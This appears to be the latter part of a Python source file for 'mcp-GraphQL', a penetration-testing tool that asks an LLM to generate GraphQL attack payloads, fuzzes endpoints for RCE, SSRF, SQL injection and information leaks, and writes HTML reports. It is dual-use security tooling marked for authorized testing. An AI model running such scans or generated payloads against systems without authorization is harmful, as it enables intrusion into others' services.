                log_error(f"  请求失败")
            results.append(result)
            continue

        # RCE 验证（支持时间盲注和回显检测）
        if 'RCE' in vuln_type.upper() or 'CMD' in vuln_type.upper():
            rce_result = verify_rce(elapsed_time, response_text)
            if rce_result['vulnerable']:
                result['vulnerable'] = True
                result['details'] = rce_result['details']
                log_vuln("RCE", f"[{rce_result['method']}] {rce_result['details']}")

        # SSRF 验证
        if 'SSRF' in vuln_type.upper():
            if status_code == 200 and 'error' not in response_text.lower():
                result['details'] = f"请求成功，请检查 OAST 平台 ({oast_domain})"
                log_warning(f"  SSRF Payload 已发送，请检查 OAST 平台")

        # 信息泄露验证
        leaked_info = verify_info_leak(response_text)
        if leaked_info:
            result['vulnerable'] = True
            result['details'] = f"发现敏感关键词: {', '.join(leaked_info)}"
            log_vuln("INFO_LEAK", f"发现敏感关键词: {', '.join(leaked_info)}")

        # SQL 注入验证
        if 'SQL' in vuln_type.upper():
            sql_indicators = ['sql', 'syntax', 'mysql', 'postgresql', 'oracle', 'sqlite', 'query']
            if any(ind in response_text.lower() for ind in sql_indicators):
                result['vulnerable'] = True
                result['details'] = "响应中包含 SQL 错误信息"
                log_vuln("SQLi", "响应中包含 SQL 错误信息!")

        if status_code:
            log_info(f"  状态码: {status_code}, 响应时间: {elapsed_time:.2f}s")

        results.append(result)

    return results


# =============================================================================
# 报告生成
# =============================================================================

def generate_html_report(results: list, target_url: str = "", output_file: str = "report.html"):
    """
    生成 HTML 格式的漏洞报告

    Args:
        results: 测试结果列表
        target_url: 目标 URL
        output_file: 输出文件路径
    """
    from datetime import datetime
    import html as html_module

    vulnerabilities = [r for r in results if r.get('vulnerable', False)]
    total_tests = len(results)
    vuln_count = len(vulnerabilities)

    # 按漏洞类型分类统计
    vuln_by_type = {}
    for vuln in vulnerabilities:
        vtype = vuln.get('type', 'UNKNOWN')
        if vtype not in vuln_by_type:
            vuln_by_type[vtype] = []
        vuln_by_type[vtype].append(vuln)

    # 生成漏洞详情 HTML
    vuln_details_html = ""
    if vulnerabilities:
        for i, vuln in enumerate(vulnerabilities, 1):
            severity_class = "high" if vuln.get('type', '').upper() in ['RCE', 'SQLI', 'SSRF'] else "medium"
            payload_escaped = html_module.escape(vuln.get('payload', '')[:500])
            details_escaped = html_module.escape(vuln.get('details', ''))
            analysis_escaped = html_module.escape(vuln.get('analysis', ''))

            vuln_details_html += f"""
            <div class="vuln-card {severity_class}">
                <div class="vuln-header">
                    <span class="vuln-number">#{i}</span>
                    <span class="vuln-type">{html_module.escape(vuln.get('type', 'UNKNOWN'))}</span>
                    <span class="severity-badge {severity_class}">{severity_class.upper()}</span>
                </div>
                <div class="vuln-body">
                    <div class="vuln-field">
                        <strong>详情:</strong>
                        <p>{details_escaped}</p>
                    </div>
                    <div class="vuln-field">
                        <strong>AI 分析:</strong>
                        <p>{analysis_escaped}</p>
                    </div>
                    <div class="vuln-field">
                        <strong>Payload:</strong>
                        <pre><code>{payload_escaped}</code></pre>
                    </div>
                    <div class="vuln-meta">
                        <span>HTTP {vuln.get('status_code', 'N/A')}</span>
                        <span>响应时间: {vuln.get('response_time', 0):.2f}s</span>
                        {"<span class='fixed-badge'>已自动修复</span>" if vuln.get('error_fixed') else ""}
                    </div>
                </div>
            </div>
            """
    else:
        vuln_details_html = """
        <div class="no-vuln">
            <p>未发现明显漏洞</p>
            <p class="hint">注意: SSRF 漏洞需要手动检查 OAST 平台</p>
        </div>
        """

    # 生成类型统计 HTML
    type_stats_html = ""
    for vtype, vulns in vuln_by_type.items():
        type_stats_html += f'<div class="stat-item"><span class="stat-type">{html_module.escape(vtype)}</span><span class="stat-count">{len(vulns)}</span></div>'

    html_template = f"""<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>mcp-GraphQL 漏洞扫描报告</title>
    <style>
        :root {{
            --primary-color: #2563eb;
            --danger-color: #dc2626;
            --warning-color: #f59e0b;
            --success-color: #10b981;
            --bg-color: #f8fafc;
            --card-bg: #ffffff;
            --text-color: #1e293b;
            --border-color: #e2e8f0;
        }}

        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}

        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            line-height: 1.6;
        }}

        .container {{
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }}

        .header {{
            background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%);
            color: white;
            padding: 40px 20px;
            text-align: center;
            margin-bottom: 30px;
            border-radius: 12px;
        }}

        .header h1 {{
            font-size: 2.5em;
            margin-bottom: 10px;
        }}

        .header .subtitle {{
            opacity: 0.9;
            font-size: 1.1em;
        }}

        .header .target-url {{
            background: rgba(255,255,255,0.2);
            padding: 8px 16px;
            border-radius: 20px;
            display: inline-block;
            margin-top: 15px;
            font-family: monospace;
        }}

        .summary {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }}

        .summary-card {{
            background: var(--card-bg);
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
            text-align: center;
        }}

        .summary-card .number {{
            font-size: 3em;
            font-weight: bold;
            display: block;
        }}

        .summary-card .label {{
            color: #64748b;
            font-size: 0.95em;
        }}

        .summary-card.danger .number {{
            color: var(--danger-color);
        }}

        .summary-card.success .number {{
            color: var(--success-color);
        }}

        .section {{
            background: var(--card-bg);
            border-radius: 12px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
            margin-bottom: 20px;
            overflow: hidden;
        }}

        .section-header {{
            background: #f1f5f9;
            padding: 15px 20px;
            font-weight: 600;
            font-size: 1.1em;
            border-bottom: 1px solid var(--border-color);
        }}

        .section-body {{
            padding: 20px;
        }}

        .vuln-card {{
            border: 1px solid var(--border-color);
            border-radius: 8px;
            margin-bottom: 15px;
            overflow: hidden;
        }}

        .vuln-card.high {{
            border-left: 4px solid var(--danger-color);
        }}

        .vuln-card.medium {{
            border-left: 4px solid var(--warning-color);
        }}

        .vuln-header {{
            background: #f8fafc;
            padding: 12px 15px;
            display: flex;
            align-items: center;
            gap: 10px;
            border-bottom: 1px solid var(--border-color);
        }}

        .vuln-number {{
            background: var(--primary-color);
            color: white;
            padding: 2px 10px;
            border-radius: 12px;
            font-size: 0.85em;
        }}

        .vuln-type {{
            font-weight: 600;
            font-size: 1.05em;
        }}

        .severity-badge {{
            margin-left: auto;
            padding: 3px 12px;
            border-radius: 12px;
            font-size: 0.75em;
            font-weight: 600;
        }}

        .severity-badge.high {{
            background: #fef2f2;
            color: var(--danger-color);
        }}

        .severity-badge.medium {{
            background: #fffbeb;
            color: var(--warning-color);
        }}

        .vuln-body {{
            padding: 15px;
        }}

        .vuln-field {{
            margin-bottom: 12px;
        }}

        .vuln-field strong {{
            color: #475569;
            display: block;
            margin-bottom: 5px;
        }}

        .vuln-field pre {{
            background: #1e293b;
            color: #e2e8f0;
            padding: 12px;
            border-radius: 6px;
            overflow-x: auto;
            font-size: 0.9em;
        }}

        .vuln-field code {{
            font-family: 'Fira Code', 'Consolas', monospace;
        }}

        .vuln-meta {{
            display: flex;
            gap: 15px;
            color: #64748b;
            font-size: 0.85em;
            padding-top: 10px;
            border-top: 1px solid var(--border-color);
        }}

        .fixed-badge {{
            background: #ecfdf5;
            color: var(--success-color);
            padding: 2px 8px;
            border-radius: 10px;
        }}

        .no-vuln {{
            text-align: center;
            padding: 40px;
            color: #64748b;
        }}

        .no-vuln p {{
            font-size: 1.2em;
            margin-bottom: 10px;
        }}

        .no-vuln .hint {{
            font-size: 0.9em;
            color: var(--warning-color);
        }}

        .stat-item {{
            display: flex;
            justify-content: space-between;
            padding: 10px 0;
            border-bottom: 1px solid var(--border-color);
        }}

        .stat-item:last-child {{
            border-bottom: none;
        }}

        .stat-type {{
            font-weight: 500;
        }}

        .stat-count {{
            background: var(--danger-color);
            color: white;
            padding: 2px 10px;
            border-radius: 10px;
            font-size: 0.85em;
        }}

        .footer {{
            text-align: center;
            padding: 20px;
            color: #64748b;
            font-size: 0.9em;
        }}

        .footer a {{
            color: var(--primary-color);
            text-decoration: none;
        }}

        @media (max-width: 768px) {{
            .header h1 {{
                font-size: 1.8em;
            }}

            .summary {{
                grid-template-columns: 1fr;
            }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>mcp-GraphQL</h1>
            <p class="subtitle">AI 驱动的 GraphQL 自动化漏洞探测报告</p>
            <div class="target-url">{html_module.escape(target_url)}</div>
        </div>

        <div class="summary">
            <div class="summary-card">
                <span class="number">{total_tests}</span>
                <span class="label">总测试数</span>
            </div>
            <div class="summary-card {"danger" if vuln_count > 0 else "success"}">
                <span class="number">{vuln_count}</span>
                <span class="label">发现漏洞</span>
            </div>
            <div class="summary-card">
                <span class="number">{len(vuln_by_type)}</span>
                <span class="label">漏洞类型</span>
            </div>
            <div class="summary-card">
                <span class="number">{datetime.now().strftime("%H:%M")}</span>
                <span class="label">扫描时间</span>
            </div>
        </div>

        {"<div class='section'><div class='section-header'>漏洞类型分布</div><div class='section-body'>" + type_stats_html + "</div></div>" if type_stats_html else ""}

        <div class="section">
            <div class="section-header">漏洞详情</div>
            <div class="section-body">
                {vuln_details_html}
            </div>
        </div>

        <div class="footer">
            <p>生成时间: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
            <p>Powered by <a href="https://github.com/yourusername/GraphQL-MCP">mcp-GraphQL</a></p>
            <p style="color: var(--danger-color); margin-top: 10px;">⚠️ 仅用于授权渗透测试</p>
        </div>
    </div>
</body>
</html>"""

    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(html_template)

    log_success(f"HTML 报告已生成: {output_file}")
    return output_file


def generate_report(results: list, output_file: str = None, target_url: str = ""):
    """生成漏洞报告"""
    print(f"\n{Colors.CYAN}{'='*60}")
    print(f"漏洞扫描报告")
    print(f"{'='*60}{Colors.RESET}\n")

    vulnerabilities = [r for r in results if r.get('vulnerable', False)]

    if vulnerabilities:
        print(f"{Colors.RED}{Colors.BOLD}发现 {len(vulnerabilities)} 个潜在漏洞:{Colors.RESET}\n")

        for i, vuln in enumerate(vulnerabilities, 1):
            print(f"{Colors.RED}[漏洞 #{i}]{Colors.RESET}")
            print(f"  类型: {Colors.MAGENTA}{vuln['type']}{Colors.RESET}")
            print(f"  详情: {vuln.get('details', '')}")
            print(f"  Payload: {Colors.WHITE}{vuln['payload'][:200]}{Colors.RESET}")
            print()
    else:
        print(f"{Colors.GREEN}未发现明显漏洞{Colors.RESET}")
        print(f"{Colors.YELLOW}注意: SSRF 漏洞需要手动检查 OAST 平台{Colors.RESET}")

    # 保存报告
    if output_file:
        report_data = {
            'total_tests': len(results),
            'vulnerabilities_found': len(vulnerabilities),
            'results': results
        }

        if output_file.endswith('.json'):
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(report_data, f, ensure_ascii=False, indent=2)
            log_success(f"JSON 报告已保存至: {output_file}")
        elif output_file.endswith('.html'):
            # 生成 HTML 报告
            generate_html_report(results, target_url, output_file)
        else:
            # 默认生成 Markdown 报告
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write("# mcp-GraphQL 漏洞扫描报告\n\n")
                f.write(f"## 扫描统计\n\n")
                f.write(f"- 总测试数: {len(results)}\n")
                f.write(f"- 发现漏洞: {len(vulnerabilities)}\n\n")
                f.write("## 漏洞详情\n\n")
                for i, vuln in enumerate(vulnerabilities, 1):
                    f.write(f"### 漏洞 #{i}: {vuln['type']}\n\n")
                    f.write(f"- **详情**: {vuln.get('details', '')}\n")
                    f.write(f"- **Payload**: `{vuln['payload']}`\n\n")
            log_success(f"Markdown 报告已保存至: {output_file}")

        # 同时自动生成 HTML 报告（如果输出文件不是 HTML）
        if not output_file.endswith('.html'):
            html_output = output_file.rsplit('.', 1)[0] + '.html' if '.' in output_file else output_file + '.html'
            generate_html_report(results, target_url, html_output)


# =============================================================================
# 主程序
# =============================================================================

def main():
    """主函数"""
    # 禁用 SSL 警告
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    parser = argparse.ArgumentParser(
        description='mcp-GraphQL - AI 驱动的 GraphQL 自动化漏洞探测工具',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  # 基础用法
  python mcp-graphql.py --url https://target.com
  python mcp-graphql.py --url https://target.com --oast-domain abc.oastify.com

  # 使用认证
  python mcp-graphql.py --url https://target.com -H "Authorization: Bearer eyJhbG..."
  python mcp-graphql.py --url https://target.com -c "session=abc123" -c "token=xyz"
  python mcp-graphql.py --url https://target.com --auth-file auth.json

  # 使用代理（Burp Suite 联动）
  python mcp-graphql.py --url https://target.com --proxy http://127.0.0.1:8080
  python mcp-graphql.py --url https://target.com -x socks5://127.0.0.1:1080

  # 组合使用
  python mcp-graphql.py --url https://target.com -H "Authorization: Bearer xxx" -x http://127.0.0.1:8080 -o report.html

认证文件格式 (auth.json):
  {
    "headers": {"Authorization": "Bearer xxx", "X-API-Key": "xxx"},
    "cookies": {"session": "xxx", "token": "xxx"}
  }

配置文件:
  可以在 config.ini 中设置默认参数，命令行参数会覆盖配置文件
        """
    )

    parser.add_argument('--url', required=True, help='目标基础 URL (必填)')
    parser.add_argument('--oast-domain', help='OAST 域名 (默认从 config.ini 读取或使用 example.oastify.com)')
    parser.add_argument('--model', help='LLM 模型 (默认从 config.ini 读取或使用 qwen)')
    parser.add_argument('--api-key', help='Qwen API Key (默认从 config.ini 或环境变量读取)')
    parser.add_argument('--timeout', type=int, help='请求超时时间 (默认从 config.ini 读取或使用 10秒)')
    parser.add_argument('--llm-timeout', type=int, default=60, help='LLM API 调用超时时间 (默认: 60秒)')
    parser.add_argument('--output', '-o', help='输出报告文件 (.json, .md 或 .html)')
    parser.add_argument('--skip-llm', action='store_true', help='跳过 LLM 分析，仅做基础扫描')
    parser.add_argument('--no-fuzz', action='store_true', help='禁用智能 AI Fuzzing（默认启用）')
    parser.add_argument('--max-iterations', type=int, default=3, help='智能 Fuzzing 最大迭代次数 (默认: 3)')

    # 认证参数
    parser.add_argument('--header', '-H', action='append', dest='headers',
                       help='添加自定义 Header，格式: "Name: Value"（可多次使用）')
    parser.add_argument('--cookie', '-c', action='append', dest='cookies',
                       help='添加 Cookie，格式: "name=value"（可多次使用）')
    parser.add_argument('--auth-file', type=str,
                       help='从 JSON 文件加载认证信息（包含 headers 和 cookies）')

    # 代理参数
    parser.add_argument('--proxy', '-x', type=str,
                       help='设置代理，支持 http/https/socks5（例如: http://127.0.0.1:8080）')

    args = parser.parse_args()

    print_banner()

    # 配置会话（认证和代理）
    if args.headers:
        for header in args.headers:
            session_config.add_header(header)

    if args.cookies:
        for cookie in args.cookies:
            session_config.add_cookie(cookie)

    if args.auth_file:
        if session_config.load_auth_file(args.auth_file):
            log_success(f"从 {args.auth_file} 加载认证信息")
        else:
            log_error(f"无法加载认证文件: {args.auth_file}")
            sys.exit(1)

    if args.proxy:
        session_config.set_proxy(args.proxy)
        log_info(f"使用代理: {args.proxy}")

    # 显示会话配置
    session_config.display_config()

    # 读取配置文件
    config = load_config()

    # 合并配置：命令行参数优先于配置文件
    final_oast_domain = args.oast_domain or config.get('oast_domain') or 'example.oastify.com'
    final_model = args.model or config.get('model') or 'qwen'
    final_api_key = args.api_key or config.get('api_key')
    final_timeout = args.timeout or config.get('timeout') or 10

    # 1. 探测 GraphQL 端点
    endpoint = detect_graphql_endpoint(args.url, final_timeout)
    if not endpoint:
        log_error("无法找到 GraphQL 端点，退出")
        sys.exit(1)

    # 2. 获取内省数据
    schema = fetch_introspection(endpoint, final_timeout)
    if not schema:
        log_error("无法获取 Schema，退出")
        sys.exit(1)

    # 3. 解析 Mutations 和 Queries
    mutations = parse_mutations(schema)
    queries = parse_queries(schema)

    if not mutations and not queries:
        log_warning("未发现任何 Mutations 或 Queries")
        sys.exit(0)

    display_schema_analysis(mutations, queries, schema)

    # 4. 使用 LLM 生成 Payload
    if not args.skip_llm and (mutations or queries):
        # 默认启用智能 Fuzzing 模式，除非使用 --no-fuzz
        use_intelligent_fuzz = not args.no_fuzz

        if use_intelligent_fuzz:
            log_info(f"🧠 启动智能 AI Fuzzing 模式（最多 {args.max_iterations} 轮）")
            results = intelligent_fuzzing(
                endpoint=endpoint,
                mutations=mutations,
                oast_domain=final_oast_domain,
                model=final_model,
                api_key=final_api_key,
                timeout=final_timeout,
                max_iterations=args.max_iterations,
                queries=queries,
                llm_timeout=args.llm_timeout
            )

            # 生成报告（自动生成 HTML 报告）
            output_file = args.output or 'report.html'
            generate_report(results, output_file, target_url=args.url)

        # 传统模式：单次生成和验证（使用 --no-fuzz 时）
        else:
            llm_response = generate_payloads_with_llm(
                mutations,
                final_oast_domain,
                final_model,
                final_api_key,
                queries=queries,
                llm_timeout=args.llm_timeout
            )

            if llm_response:
                log_success("LLM Payload 生成成功")
                print(f"\n{Colors.CYAN}LLM 生成的 Payload:{Colors.RESET}")
                print(f"{Colors.WHITE}{llm_response}{Colors.RESET}")

                # 5. 解析并验证 Payload
                payloads = parse_payloads(llm_response)

                if payloads:
                    results = run_vulnerability_verification(
                        endpoint,
                        payloads,
                        final_oast_domain,
                        final_timeout
                    )

                    # 6. 生成报告
                    output_file = args.output or 'report.html'
                    generate_report(results, output_file, target_url=args.url)
                else:
                    log_warning("无法解析 LLM 返回的 Payload")
            else:
                log_error("LLM Payload 生成失败")
    else:
        log_info("跳过 LLM 分析")

    print(f"\n{Colors.GREEN}扫描完成!{Colors.RESET}")
    if final_oast_domain and final_oast_domain != 'example.oastify.com':
        print(f"{Colors.YELLOW}[提醒] 请检查 OAST 平台 ({final_oast_domain}) 确认 SSRF或RCE 漏洞{Colors.RESET}")


if __name__ == '__main__':
    main()
